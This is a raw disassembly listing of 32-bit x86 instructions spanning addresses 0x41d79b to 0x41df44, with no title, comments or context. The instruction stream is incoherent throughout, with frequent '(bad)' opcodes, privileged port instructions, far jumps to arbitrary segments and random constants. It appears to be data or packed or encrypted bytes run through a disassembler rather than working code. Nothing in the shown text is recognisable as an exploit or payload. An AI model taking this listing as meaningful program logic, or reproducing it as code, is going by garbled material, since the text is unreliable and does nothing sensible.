  41d79b:	inc    BYTE PTR [edx-0x2ca592b0]
  41d7a1:	jbe    0x41d7b6
  41d7a3:	into   
  41d7a4:	jg     0x41d80d
  41d7a6:	scas   al,BYTE PTR es:[edi]
  41d7a7:	mov    eax,ds:0xef4cc87f
  41d7ac:	cmp    esi,DWORD PTR [edi]
  41d7ae:	sbb    eax,0x5b4a20ee
  41d7b3:	lock adc esp,DWORD PTR [ebx+0x20]
  41d7b7:	outs   dx,DWORD PTR ds:[esi]
  41d7b8:	pop    esp
  41d7b9:	ins    DWORD PTR es:[edi],dx
  41d7ba:	adc    al,0x72
  41d7bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d7bd:	cs xchg edx,eax
  41d7c0:	cdq    
  41d7c1:	xor    esp,DWORD PTR [eax+0x7485df47]
  41d7c7:	cwde   
  41d7c8:	inc    DWORD PTR [edi-0x58]
  41d7cb:	(bad)  
  41d7cc:	in     eax,0x25
  41d7ce:	cmp    ecx,DWORD PTR [ebp+0x61]
  41d7d1:	inc    ebx
  41d7d2:	jge    0x41d7a8
  41d7d4:	test   BYTE PTR [ebx+ebx*2],ch
  41d7d7:	imul   DWORD PTR [ebx]
  41d7d9:	mov    ds:0xc9840c8a,al
  41d7de:	pop    ds
  41d7df:	retf   0x7524
  41d7e2:	inc    esp
  41d7e3:	cmp    al,0x50
  41d7e5:	out    0x17,eax
  41d7e7:	shl    DWORD PTR [edi+ebx*2],0xa5
  41d7eb:	retf   
  41d7ec:	mov    ebx,0x186324e9
  41d7f1:	pusha  
  41d7f2:	(bad)  
  41d7f3:	push   ss
  41d7f4:	cdq    
  41d7f5:	sub    ecx,DWORD PTR [ebp*8-0xb5e64]
  41d7fc:	pusha  
  41d7fd:	ret    
  41d7fe:	imul   ebx,esp,0x986d9a1b
  41d804:	loopne 0x41d7ee
  41d806:	pushf  
  41d807:	jns    0x41d819
  41d809:	sub    al,bh
  41d80b:	sbb    ebx,DWORD PTR [edx-0x36]
  41d80e:	das    
  41d80f:	idiv   al
  41d811:	or     BYTE PTR [esi-0x49fcc639],ah
  41d817:	pop    edx
  41d818:	pusha  
  41d819:	inc    edx
  41d81a:	cwde   
  41d81b:	pop    ecx
  41d81c:	ins    BYTE PTR es:[edi],dx
  41d81d:	mov    gs,WORD PTR [esp+edx*1+0x3f701d23]
  41d824:	bound  eax,QWORD PTR [esi+0x42]
  41d827:	jne    0x41d833
  41d829:	adc    al,0x55
  41d82b:	adc    DWORD PTR [ebx-0x49756f89],0xffffffd7
  41d832:	inc    edx
  41d833:	bound  ebx,QWORD PTR [ebp+eiz*4+0x25]
  41d837:	jecxz  0x41d85d
  41d839:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d83a:	addr16 and al,0xa6
  41d83d:	mov    al,BYTE PTR [eax]
  41d83f:	or     BYTE PTR [ebp-0x75],bl
  41d842:	adc    edi,ecx
  41d844:	mov    edi,0x38ac9155
  41d849:	ret    
  41d84a:	test   eax,0x395099d2
  41d84f:	popf   
  41d850:	stos   DWORD PTR es:[edi],eax
  41d851:	mov    edi,DWORD PTR [esi-0x46196cee]
  41d857:	push   bp
  41d859:	xchg   ebp,eax
  41d85a:	mov    ch,bl
  41d85c:	xchg   ebx,eax
  41d85d:	inc    eax
  41d85e:	sub    eax,0xc2a65a4
  41d863:	or     BYTE PTR [edx-0x4240eb69],dh
  41d869:	into   
  41d86a:	add    dl,BYTE PTR [ebx+0x26]
  41d86d:	lods   eax,DWORD PTR ds:[esi]
  41d86e:	test   DWORD PTR [ebx+esi*4+0x6220ba4e],ebp
  41d875:	and    bl,BYTE PTR [ebx+0x460c2e5b]
  41d87b:	dec    ecx
  41d87c:	cdq    
  41d87d:	enter  0x82a6,0xc2
  41d881:	ds push cs
  41d883:	cli    
  41d884:	xor    al,0xec
  41d886:	mov    bh,BYTE PTR [eax-0x4699bd08]
  41d88c:	adc    ebx,ebx
  41d88e:	sbb    DWORD PTR [ebp-0x13],ebx
  41d891:	mov    dh,0xef
  41d893:	call   0xa4a2:0x94529c1e
  41d89a:	rol    DWORD PTR [ecx+0x4c04e66],cl
  41d8a0:	icebp  
  41d8a1:	pop    esp
  41d8a2:	jmp    0x495c:0x80cc8207
  41d8a9:	mov    dh,0xae
  41d8ab:	add    bh,0x1f
  41d8ae:	mov    al,0xe9
  41d8b0:	sub    eax,0x50de23da
  41d8b5:	cmp    eax,DWORD PTR [ebp+edi*8-0x7acaa876]
  41d8bc:	jecxz  0x41d8ac
  41d8be:	jno    0x41d8e4
  41d8c0:	mov    DWORD PTR [ebx+0x7904cb21],eax
  41d8c6:	(bad)  
  41d8c7:	fdivr  st(2),st
  41d8c9:	dec    esi
  41d8ca:	stos   DWORD PTR es:[edi],eax
  41d8cb:	cld    
  41d8cc:	std    
  41d8cd:	sbb    al,0xd8
  41d8cf:	int    0xfa
  41d8d1:	jae    0x41d901
  41d8d3:	hlt    
  41d8d4:	gs popa 
  41d8d6:	retf   0x30a5
  41d8d9:	out    0xc5,eax
  41d8db:	js     0x41d8d6
  41d8dd:	bound  ecx,QWORD PTR [ebp-0x303953b]
  41d8e3:	sub    bl,dl
  41d8e5:	shl    DWORD PTR [edi],0x6
  41d8e8:	add    eax,0x2cf4dc34
  41d8ed:	dec    ebx
  41d8ee:	mov    ah,0xe1
  41d8f0:	jb     0x41d940
  41d8f2:	icebp  
  41d8f3:	(bad)  
  41d8f4:	ret    
  41d8f5:	es retf 
  41d8f7:	lods   eax,DWORD PTR ds:[esi]
  41d8f8:	jp     0x41d8ac
  41d8fa:	repnz out 0xe3,eax
  41d8fd:	stos   BYTE PTR es:[edi],al
  41d8fe:	adc    ebp,DWORD PTR [edx-0x2a]
  41d901:	fdivp  st(4),st
  41d903:	sub    al,0x86
  41d905:	imul   edi,DWORD PTR [edi],0x4027a2ad
  41d90b:	dec    edx
  41d90c:	imul   eax,DWORD PTR [ecx+0x33],0xa8e27016
  41d913:	ret    
  41d914:	or     al,0x99
  41d916:	mov    ds:0x46913f2b,al
  41d91b:	shl    BYTE PTR [edi+0x1c20e11b],1
  41d921:	outs   dx,DWORD PTR ds:[esi]
  41d922:	mov    ecx,0xcbe5407
  41d927:	mov    ch,bl
  41d929:	jmp    0x41d959
  41d92b:	mov    ecx,0x30185cad
  41d930:	jns    0x41d94a
  41d932:	outs   dx,DWORD PTR ds:[esi]
  41d933:	dec    esp
  41d934:	es xchg edi,eax
  41d936:	adc    eax,0xd9f105d2
  41d93b:	mov    dl,0x8e
  41d93d:	mov    ah,0x71
  41d93f:	cmp    al,0x6d
  41d941:	mov    ah,0x2d
  41d943:	in     al,dx
  41d944:	sti    
  41d945:	les    edx,FWORD PTR [ebp+ebp*4-0x15fc966f]
  41d94c:	gs scas al,BYTE PTR es:[edi]
  41d94e:	mov    al,ds:0x49f3c174
  41d953:	into   
  41d954:	inc    esi
  41d955:	mov    ebp,0xf9694444
  41d95a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d95b:	xor    dh,BYTE PTR [edi]
  41d95d:	ja     0x41d994
  41d95f:	clc    
  41d960:	push   es
  41d961:	das    
  41d962:	stos   BYTE PTR es:[di],al
  41d964:	and    eax,0x36b39449
  41d969:	loop   0x41d930
  41d96b:	jmp    0xa6f47b11
  41d970:	jb     0x41d97a
  41d972:	mov    esi,0x736aef78
  41d977:	cli    
  41d978:	int    0x3d
  41d97a:	adc    eax,DWORD PTR [ebx+0x73a2194b]
  41d980:	push   0xffffff90
  41d982:	push   eax
  41d983:	sahf   
  41d984:	mov    DWORD PTR [eax-0x2c],edx
  41d987:	add    al,0x4a
  41d989:	test   BYTE PTR [ebp-0x1d9e0b32],cl
  41d98f:	ror    DWORD PTR [esi],cl
  41d991:	or     eax,0x673a94c2
  41d996:	ror    BYTE PTR [edi+eax*4],cl
  41d999:	(bad)
  41d99e:	xchg   DWORD PTR [esi-0x60],ebp
  41d9a1:	les    edx,FWORD PTR [eax]
  41d9a3:	xor    esp,ebp
  41d9a5:	jbe    0x41d9b0
  41d9a7:	cmc    
  41d9a8:	jne    0x41d98e
  41d9aa:	inc    esi
  41d9ab:	adc    bh,ch
  41d9ad:	popf   
  41d9ae:	jns    0x41d934
  41d9b0:	adc    DWORD PTR [edi-0x3bc206b5],eax
  41d9b6:	jp     0x41d9c9
  41d9b8:	xlat   BYTE PTR ds:[ebx]
  41d9b9:	inc    ebx
  41d9ba:	test   eax,0x1c16c2dd
  41d9bf:	imul   edi,DWORD PTR [ebx],0xbc010aca
  41d9c5:	sbb    DWORD PTR [edx],esp
  41d9c7:	add    bh,BYTE PTR [eax+0x44d9ccea]
  41d9cd:	and    al,0xe4
  41d9cf:	adc    al,0x39
  41d9d1:	ret    
  41d9d2:	nop
  41d9d3:	jecxz  0x41da12
  41d9d5:	lahf   
  41d9d6:	aam    0x37
  41d9d8:	std    
  41d9d9:	jle    0x41d9c5
  41d9db:	add    BYTE PTR [ebx],bl
  41d9dd:	js     0x41da2e
  41d9df:	dec    ebx
  41d9e0:	fcomp  st(4)
  41d9e2:	ja     0x41da12
  41d9e4:	or     ch,ah
  41d9e6:	lea    edi,[ebp+0x20e071ad]
  41d9ec:	sbb    bl,BYTE PTR [esi]
  41d9ee:	add    esp,DWORD PTR [ebx]
  41d9f0:	xor    al,0x86
  41d9f2:	sbb    BYTE PTR [ebp-0x455512f5],dl
  41d9f8:	jmp    0x70a18bc
  41d9fd:	icebp  
  41d9fe:	jmp    0xd1a56a20
  41da03:	jo     0x41da46
  41da05:	pop    es
  41da06:	neg    esp
  41da08:	ds add al,0xdd
  41da0b:	pop    esi
  41da0c:	mov    WORD PTR [esi-0x3cac62a7],ss
  41da12:	in     al,dx
  41da13:	mov    ds:0xeb0fdc47,al
  41da18:	dec    edi
  41da19:	scas   eax,DWORD PTR es:[edi]
  41da1a:	sub    edx,DWORD PTR [esi+0x35]
  41da1d:	mul    BYTE PTR [edx-0x6]
  41da20:	mov    ah,0x2c
  41da22:	xor    eax,DWORD PTR [ecx]
  41da24:	aaa    
  41da25:	cdq    
  41da26:	scas   al,BYTE PTR es:[edi]
  41da27:	dec    ecx
  41da28:	mov    edx,0xfdaa3129
  41da2d:	mov    dh,bl
  41da2f:	adc    eax,0xc04d5361
  41da34:	push   ebx
  41da35:	inc    ecx
  41da36:	cld    
  41da37:	(bad)  
  41da38:	jge    0x41d9e1
  41da3a:	hlt    
  41da3b:	dec    edi
  41da3c:	xchg   ebp,eax
  41da3d:	and    BYTE PTR ds:0x9f1d7ebb,al
  41da43:	and    eax,0xa503c25d
  41da48:	daa    
  41da49:	(bad)  
  41da4a:	test   eax,0x2b430f9a
  41da4f:	imul   dh
  41da51:	mov    ds:0x34cf2e0a,al
  41da56:	adc    eax,DWORD PTR [eax]
  41da58:	fldcw  WORD PTR [eax+0x6d948b2b]
  41da5e:	ret    0x2a06
  41da61:	jae    0x41da55
  41da63:	cdq    
  41da64:	int    0x23
  41da66:	aam    0x43
  41da68:	adc    ecx,DWORD PTR [edx+0x10]
  41da6b:	sub    cl,BYTE PTR [eax+0x6e232fde]
  41da71:	jo     0x41daf0
  41da73:	inc    edi
  41da74:	or     edx,esi
  41da76:	jno    0x41da35
  41da78:	bnd jl 0x41da23
  41da7b:	loop   0x41da79
  41da7d:	stc    
  41da7e:	stos   BYTE PTR es:[edi],al
  41da7f:	call   0xe3cb:0x10028bc5
  41da86:	mov    ebx,0x3d715a45
  41da8b:	nop
  41da8c:	sbb    edi,esp
  41da8e:	jno    0x41dabd
  41da90:	rcr    BYTE PTR cs:[edx+0x284b06a7],cl
  41da97:	sub    BYTE PTR [edi+0x50374033],ch
  41da9d:	ffreep st(1)
  41da9f:	adc    ch,BYTE PTR ds:0x2823667a
  41daa5:	rol    dl,1
  41daa7:	popf   
  41daa8:	imul   eax,edx,0x7
  41daab:	lock in al,0x1d
  41daae:	rcl    DWORD PTR [ebp+0x19],0x13
  41dab2:	xchg   esp,eax
  41dab3:	je     0x41db04
  41dab5:	in     al,dx
  41dab6:	cs add esi,eax
  41dab9:	out    dx,al
  41daba:	cmp    BYTE PTR [eax+0x4dde4b1d],ch
  41dac0:	mov    al,0x96
  41dac2:	das    
  41dac3:	call   0x242c9ce6
  41dac8:	push   edi
  41dac9:	scas   eax,DWORD PTR es:[edi]
  41daca:	inc    ebx
  41dacb:	call   0x44a6:0x444c36a4
  41dad2:	ja     0x41da56
  41dad4:	mov    esp,0x433dcef7
  41dad9:	into   
  41dada:	(bad)  
  41dadb:	aaa    
  41dadc:	add    esp,esp
  41dade:	sub    eax,0x123817c
  41dae3:	push   ebp
  41dae4:	dec    ebp
  41dae5:	fwait
  41dae6:	and    ebp,0xffffffd8
  41dae9:	jae    0x41db12
  41daeb:	call   FWORD PTR [eax-0x34f3d12d]
  41daf1:	or     ecx,0x1
  41daf4:	sbb    al,0x40
  41daf6:	cs scas al,BYTE PTR es:[edi]
  41daf8:	sbb    al,0x89
  41dafa:	retf   
  41dafb:	push   0x861f1c46
  41db00:	push   ecx
  41db01:	(bad)  
  41db02:	push   esp
  41db03:	fist   WORD PTR [ecx+0x73]
  41db06:	push   esi
  41db07:	popf   
  41db08:	(bad)  
  41db09:	jnp    0x41da9e
  41db0b:	repnz adc eax,0x8ba1e37a
  41db11:	fldcw  WORD PTR [eax*2+0x6955df4d]
  41db18:	gs (bad) 
  41db1a:	iret   
  41db1b:	add    edx,DWORD PTR [esi+0x7]
  41db1e:	and    eax,0x397cdf78
  41db23:	aas    
  41db24:	sbb    BYTE PTR ds:0x6d5cf7b5,ah
  41db2a:	or     ecx,DWORD PTR [eax]
  41db2c:	sub    BYTE PTR [edx],al
  41db2e:	repnz pushf 
  41db30:	sbb    ah,BYTE PTR [bp-0x6d60]
  41db35:	test   al,0x33
  41db37:	add    DWORD PTR [ecx-0x23],0x704322aa
  41db3e:	pop    esi
  41db3f:	jmp    0xe01ac043
  41db44:	push   eax
  41db45:	fld    TBYTE PTR [ecx-0x1898f788]
  41db4b:	sbb    dh,cl
  41db4d:	(bad)  
  41db4e:	loop   0x41dba7
  41db50:	adc    DWORD PTR [ebx],eax
  41db52:	ret    0xd303
  41db55:	je     0x41db26
  41db57:	pop    esi
  41db58:	aam    0x2
  41db5a:	mov    edi,0xdb09cd85
  41db5f:	into   
  41db60:	stos   BYTE PTR es:[edi],al
  41db61:	retf   0x8089
  41db64:	sub    BYTE PTR [edx+0x126ad5b8],bh
  41db6a:	add    eax,0x126ef28e
  41db6f:	imul   ebx,ebx,0xffffff88
  41db72:	bound  esi,QWORD PTR [ebx-0x543f2c7c]
  41db78:	arpl   WORD PTR [ecx+ebx*8],ax
  41db7b:	jno    0x41dbb3
  41db7d:	add    dl,0x77
  41db80:	lods   al,BYTE PTR ds:[esi]
  41db81:	or     BYTE PTR [ecx+esi*2-0x39],0xcf
  41db86:	jg     0x41dc02
  41db88:	out    dx,eax
  41db89:	dec    eax
  41db8a:	xchg   ebx,eax
  41db8b:	mov    ecx,0x45f459e0
  41db90:	clc    
  41db91:	test   BYTE PTR [eax+0x73],dl
  41db94:	push   cs
  41db95:	jg     0x41dbe8
  41db97:	shl    WORD PTR [ebx-0x1779e680],cl
  41db9e:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dba0:	in     eax,dx
  41dba1:	mov    bl,0xee
  41dba3:	jno    0x41db6d
  41dba5:	mov    al,0xc4
  41dba7:	div    DWORD PTR [edi]
  41dba9:	stos   BYTE PTR es:[edi],al
  41dbaa:	(bad)  [edi-0x32bb4641]
  41dbb0:	inc    edi
  41dbb1:	pop    ss
  41dbb2:	mov    al,0xc4
  41dbb4:	inc    eax
  41dbb5:	mov    dl,ah
  41dbb7:	and    bl,BYTE PTR [esi+0x26e05a83]
  41dbbd:	or     BYTE PTR [eax-0x27],ch
  41dbc0:	jbe    0x41db9b
  41dbc2:	lods   al,BYTE PTR ds:[esi]
  41dbc3:	jbe    0x41db5a
  41dbc5:	pop    esp
  41dbc6:	popa   
  41dbc7:	pop    eax
  41dbc8:	mov    edi,0x76d5e748
  41dbcd:	retf   0xe89c
  41dbd0:	scas   eax,DWORD PTR es:[edi]
  41dbd1:	and    DWORD PTR [ecx-0x56],ecx
  41dbd4:	and    eax,DWORD PTR [edi]
  41dbd6:	lds    ebp,FWORD PTR [ebp-0x5e]
  41dbd9:	sub    ah,dl
  41dbdb:	test   al,0x59
  41dbdd:	mov    ebx,0x4ffb0145
  41dbe2:	xor    eax,0x5038b70b
  41dbe7:	adc    DWORD PTR [edi-0x2ff9d652],edx
  41dbed:	popf   
  41dbee:	outs   dx,BYTE PTR ds:[esi]
  41dbef:	into   
  41dbf0:	or     eax,0x1b1dee9c
  41dbf5:	inc    eax
  41dbf6:	and    BYTE PTR [edx+0x3dc3f561],0xe6
  41dbfd:	dec    edi
  41dbfe:	mov    bl,0x84
  41dc00:	xor    DWORD PTR [ebp+0x38976fbe],esp
  41dc06:	push   ebp
  41dc07:	cmp    al,cl
  41dc09:	stos   DWORD PTR es:[edi],eax
  41dc0a:	cdq    
  41dc0b:	push   ss
  41dc0c:	or     esi,DWORD PTR ds:0x69a6c52e
  41dc12:	adc    BYTE PTR [ecx-0x533d1f4c],0x8
  41dc19:	pop    esp
  41dc1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dc1b:	cmp    al,0x18
  41dc1d:	jecxz  0x41dbee
  41dc1f:	jmp    0xa0fc40a5
  41dc24:	xlat   BYTE PTR ds:[ebx]
  41dc25:	mov    ebx,0x6896d11
  41dc2a:	rol    DWORD PTR [edi+edi*4],cl
  41dc2d:	push   ebx
  41dc2e:	mov    ?,ecx
  41dc30:	aam    0x8e
  41dc32:	cmp    BYTE PTR [ebp+0x401a0e6c],ah
  41dc38:	xor    DWORD PTR [ebp+0x31e57b97],0x5d
  41dc3f:	xchg   ebp,eax
  41dc40:	inc    ebp
  41dc41:	jmp    0x421a3d48
  41dc46:	fwait
  41dc47:	leave  
  41dc48:	les    edx,FWORD PTR [ecx-0x56ca4b83]
  41dc4e:	add    al,0x42
  41dc50:	add    BYTE PTR [esi+0x7d],dl
  41dc53:	inc    BYTE PTR [esi-0x16cadc10]
  41dc59:	sub    DWORD PTR [ebx],esp
  41dc5b:	iret   
  41dc5c:	scas   al,BYTE PTR es:[edi]
  41dc5d:	xor    BYTE PTR [ebx+0x3c],al
  41dc60:	or     eax,0xb8e50b10
  41dc65:	mov    bh,0xd5
  41dc67:	sti    
  41dc68:	bound  ebx,QWORD PTR [ebx]
  41dc6a:	push   0x71d6b3b7
  41dc6f:	jp     0x41dbf4
  41dc71:	mov    ds:0xb871b953,eax
  41dc76:	pop    ebx
  41dc77:	and    ebx,DWORD PTR [esi]
  41dc79:	inc    ecx
  41dc7a:	mov    DWORD PTR [ebp-0x41e25c96],ebp
  41dc80:	dec    ebp
  41dc81:	pop    ds
  41dc82:	(bad)  
  41dc84:	push   eax
  41dc85:	test   BYTE PTR [ecx-0x2582a14d],bh
  41dc8b:	data16 jle 0x41dc92
  41dc8e:	jnp    0x41dc82
  41dc90:	fistp  WORD PTR [esp+ebx*4-0x75]
  41dc94:	pop    esi
  41dc95:	adc    eax,0x87c18b0a
  41dc9a:	and    BYTE PTR [eax],bl
  41dc9c:	outs   dx,DWORD PTR ds:[esi]
  41dc9d:	sahf   
  41dc9e:	fist   WORD PTR [ecx+0x7ccacc3a]
  41dca4:	cmp    bl,BYTE PTR [eax+0x316a42d8]
  41dcaa:	mov    ebx,0x76bf6592
  41dcaf:	adc    eax,0x64c8001d
  41dcb4:	je     0x41dc4b
  41dcb6:	pop    ecx
  41dcb7:	push   ss
  41dcb8:	and    BYTE PTR [edi+edi*4-0x1ac4d40f],dl
  41dcbf:	call   0xcadfd720
  41dcc4:	mov    esi,0xa5516324
  41dcc9:	sbb    bh,BYTE PTR [esi*2+0x64f35d1b]
  41dcd0:	mov    al,ds:0xbfabbc6
  41dcd5:	dec    ebp
  41dcd6:	pop    esp
  41dcd7:	xor    DWORD PTR [esi],ebp
  41dcd9:	lods   eax,DWORD PTR ds:[esi]
  41dcdb:	sbb    edi,0x9641ecd
  41dce1:	aad    0xdb
  41dce3:	add    eax,0x1cab0a69
  41dce8:	jno    0x41dcd4
  41dcea:	cmc    
  41dceb:	and    eax,0x3c789feb
  41dcf0:	sub    ah,ch
  41dcf2:	push   ss
  41dcf3:	sar    BYTE PTR [ebp+0x28],cl
  41dcf6:	push   cs
  41dcf7:	jl     0x41dd5a
  41dcf9:	outs   dx,DWORD PTR ds:[esi]
  41dcfa:	and    edx,edx
  41dcfc:	imul   ebx,DWORD PTR es:[ecx],0x832c3583
  41dd03:	sub    eax,0xb54c478b
  41dd08:	mov    eax,0xf7c2b927
  41dd0d:	add    bh,cl
  41dd0f:	ss jbe 0x41dd42
  41dd12:	pop    ss
  41dd13:	imul   esi,DWORD PTR [edx+0x6e78cd8a],0xffffffb0
  41dd1a:	cld    
  41dd1b:	mov    BYTE PTR [eax+0x5b2dfc3e],bl
  41dd21:	and    DWORD PTR [esi-0x15749be],0xf0ab52d8
  41dd2b:	mov    dh,0xde
  41dd2d:	cmp    eax,0xe928a5db
  41dd32:	jl     0x41ddb1
  41dd34:	les    esp,FWORD PTR [esi]
  41dd36:	sti    
  41dd37:	or     ch,bh
  41dd39:	jo     0x41dda0
  41dd3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd3c:	enter  0x5345,0x3c
  41dd40:	xor    eax,0x34f9fe7e
  41dd45:	mov    bh,0x3b
  41dd47:	inc    edx
  41dd48:	xchg   esp,eax
  41dd49:	retf   
  41dd4a:	mov    esp,0x6ccfd3f8
  41dd4f:	or     al,ah
  41dd51:	jbe    0x41dd97
  41dd53:	xchg   esi,eax
  41dd54:	and    DWORD PTR [ebp+0x5d],edi
  41dd57:	xchg   edi,eax
  41dd58:	arpl   WORD PTR ds:[ebp+0x1d632291],cx
  41dd5f:	or     edx,DWORD PTR [eax+ecx*1+0x1e]
  41dd63:	inc    esp
  41dd64:	xchg   esi,eax
  41dd65:	test   BYTE PTR [ebx],bl
  41dd67:	lods   eax,DWORD PTR ds:[esi]
  41dd68:	jg     0x41dd24
  41dd6a:	xlat   BYTE PTR ds:[ebx]
  41dd6b:	sub    al,0x77
  41dd6d:	sbb    DWORD PTR [edi+edi*2+0x4f],esp
  41dd71:	xchg   ebp,eax
  41dd72:	out    dx,eax
  41dd73:	jae    0x41dd4d
  41dd75:	sub    al,BYTE PTR [edx-0x1]
  41dd78:	adc    edi,edx
  41dd7a:	enter  0xc544,0xb3
  41dd7e:	sbb    eax,0xcfcb1077
  41dd83:	add    edi,ebx
  41dd85:	ja     0x41dd89
  41dd87:	jecxz  0x41dd5f
  41dd89:	add    BYTE PTR [edi-0x3b],dh
  41dd8c:	add    edi,DWORD PTR [eax+0xa]
  41dd8f:	xor    al,0x0
  41dd91:	push   edx
  41dd92:	jns    0x41ddae
  41dd94:	aam    0x8e
  41dd96:	jae    0x41dd68
  41dd98:	push   ecx
  41dd99:	inc    ecx
  41dd9a:	je     0x41ddb4
  41dd9c:	and    cl,bl
  41dd9e:	icebp  
  41dd9f:	push   ecx
  41dda0:	iret   
  41dda1:	inc    esi
  41dda2:	jmp    0x2d56:0x111f0db1
  41dda9:	dec    ebp
  41ddaa:	mov    ah,0xd9
  41ddac:	sbb    BYTE PTR [esi],0x7a
  41ddaf:	clc    
  41ddb0:	fwait
  41ddb1:	gs aam 0x5d
  41ddb4:	icebp  
  41ddb5:	sub    al,0x83
  41ddb7:	jae    0x41ddd2
  41ddb9:	jle    0x41dd8c
  41ddbb:	xchg   esi,eax
  41ddbc:	(bad)  
  41ddbd:	sbb    al,0x66
  41ddbf:	inc    edx
  41ddc0:	xchg   ecx,esi
  41ddc2:	dec    ebp
  41ddc3:	mov    eax,0x16e97dc8
  41ddc8:	fidiv  WORD PTR [ecx+ecx*1]
  41ddcb:	jae    0x41ddc3
  41ddcd:	cmp    DWORD PTR [ecx-0x46c0a89b],esi
  41ddd3:	les    edx,FWORD PTR [edi]
  41ddd5:	xchg   ecx,eax
  41ddd6:	sbb    DWORD PTR [edi],ebx
  41ddd8:	mov    esp,DWORD PTR ds:0x764dc5e0
  41ddde:	pop    ebp
  41dddf:	or     edi,DWORD PTR [ebp+0xefbcdb8]
  41dde5:	inc    ecx
  41dde6:	or     al,ah
  41dde8:	outs   dx,BYTE PTR ds:[esi]
  41dde9:	pop    es
  41ddea:	(bad)  
  41ddeb:	aam    0xde
  41dded:	int3   
  41ddee:	inc    edi
  41ddef:	cmp    ecx,DWORD PTR [eax-0x17]
  41ddf2:	in     eax,dx
  41ddf3:	jge    0x41dd81
  41ddf5:	js     0x41dd7f
  41ddf7:	je     0x41dd7e
  41ddf9:	or     al,0x99
  41ddfb:	test   al,0x0
  41ddfd:	bound  esi,QWORD PTR [ebx-0x32008457]
  41de03:	add    al,0xe4
  41de05:	retf   0xaeb4
  41de08:	mov    edx,DWORD PTR [ebx-0x7c]
  41de0b:	aam    0x38
  41de0d:	xor    BYTE PTR [ebx+0x697c6ba5],bl
  41de13:	and    BYTE PTR [edi],0x14
  41de16:	adc    al,cl
  41de18:	and    eax,0xdd6001cc
  41de1d:	jo     0x41ddff
  41de1f:	and    ch,BYTE PTR [ecx-0x3f]
  41de22:	xchg   ebx,eax
  41de23:	xor    DWORD PTR [eax-0x3d],ecx
  41de26:	or     ah,0x3
  41de29:	push   es
  41de2a:	cmp    DWORD PTR [esi-0x4c990444],ebp
  41de30:	mov    ecx,0xba64373d
  41de35:	outs   dx,DWORD PTR ds:[esi]
  41de36:	sub    bh,BYTE PTR [esp+ecx*8+0x5e]
  41de3a:	fcom   QWORD PTR [ebp+ebp*8+0x366a27fa]
  41de41:	pop    ecx
  41de42:	retf   0xd85d
  41de45:	out    0xda,eax
  41de47:	add    ch,ah
  41de49:	(bad)  
  41de4a:	leave  
  41de4b:	inc    edx
  41de4c:	cs scas al,BYTE PTR es:[edi]
  41de4e:	popf   
  41de4f:	repz push eax
  41de51:	or     al,0xc2
  41de53:	mov    gs,esp
  41de55:	push   esi
  41de56:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de58:	mov    dl,0xfa
  41de5a:	out    dx,al
  41de5b:	sub    DWORD PTR [ebp+0x491d2f26],eax
  41de61:	imul   edi,DWORD PTR [ecx+0x6f],0x938500bf
  41de68:	shl    BYTE PTR [esi+0x74875325],1
  41de6e:	mov    esp,ebp
  41de70:	pushf  
  41de71:	mov    eax,ds:0x76f014cc
  41de76:	loopne 0x41def1
  41de78:	rcl    DWORD PTR [ecx-0x35],1
  41de7b:	mov    esp,0x3d6a7a11
  41de80:	shl    DWORD PTR [ebp+0x2efb94f1],0xd
  41de87:	iret   
  41de88:	push   cs
  41de89:	or     al,0x32
  41de8b:	in     eax,0x4
  41de8d:	add    dl,BYTE PTR [edi-0x17]
  41de90:	jle    0x41de73
  41de92:	daa    
  41de93:	mov    ds:0xa3b0de41,eax
  41de98:	daa    
  41de99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de9a:	jno    0x41df09
  41de9c:	pop    ds
  41de9d:	fisttp DWORD PTR [ebp-0x23]
  41dea0:	sub    eax,0x77b8d0fb
  41dea5:	fwait
  41dea6:	and    al,0xda
  41dea8:	test   BYTE PTR [edi-0x5d77d3e],ch
  41deae:	test   DWORD PTR [esi],ebx
  41deb0:	pop    ebx
  41deb1:	lods   al,BYTE PTR ds:[esi]
  41deb2:	push   esp
  41deb3:	dec    esi
  41deb4:	mov    ebp,0x553d6758
  41deb9:	inc    ebx
  41deba:	xor    DWORD PTR [eax+eax*8],esi
  41debd:	imul   edi,DWORD PTR [ecx],0xffffffb2
  41dec0:	mov    BYTE PTR [edi-0x7dc3f00e],al
  41dec6:	mov    ah,dl
  41dec8:	add    DWORD PTR [ecx+0x1a],esi
  41decb:	jle    0x41de7c
  41decd:	ja     0x41de61
  41decf:	adc    edi,DWORD PTR [ebp-0x7152db16]
  41ded5:	mov    cl,0x8a
  41ded7:	sbb    ebx,esi
  41ded9:	mov    ds:0x9b3ebfdb,eax
  41dede:	fwait
  41dedf:	sub    eax,0xf066d029
  41dee4:	lea    ebx,[esi+0x4f5b2405]
  41deea:	cmp    al,0x8a
  41deec:	stc    
  41deed:	(bad)  
  41deee:	(bad)  
  41def0:	inc    DWORD PTR [edx-0x218675d0]
  41def6:	mov    bh,0x40
  41def8:	into   
  41def9:	adc    esp,DWORD PTR [edi-0x6b7014cf]
  41deff:	xchg   BYTE PTR [edx+0x6d35b3ac],ch
  41df05:	adc    BYTE PTR [edi],cl
  41df07:	pop    edi
  41df08:	je     0x41ded5
  41df0a:	or     BYTE PTR [esp+ebx*2+0x43e34cbb],ah
  41df11:	call   0x956e:0x5390836f
  41df18:	arpl   WORD PTR [esi-0x24],sp
  41df1b:	iret   
  41df1c:	nop
  41df1d:	jno    0x41df51
  41df1f:	xchg   esi,eax
  41df20:	scas   eax,DWORD PTR es:[edi]
  41df21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df22:	adc    cl,BYTE PTR [eax]
  41df24:	jecxz  0x41df9d
  41df26:	xor    eax,DWORD PTR [ebx-0x74]
  41df29:	ds dec eax
  41df2b:	pop    esi
  41df2c:	scas   al,BYTE PTR es:[edi]
  41df2d:	nop
  41df2e:	or     ecx,esi
  41df30:	leave  
  41df31:	fild   QWORD PTR [ebp-0x30]
  41df34:	jge    0x41df50
  41df36:	mov    edi,0x35db717c
  41df3b:	repz ja 0x41df5e
  41df3e:	xor    edi,DWORD PTR [edi]
  41df40:	js     0x41dee7
  41df42:	push   ebp
  41df43:	pop    ebp
  41df44:	inc    ecx
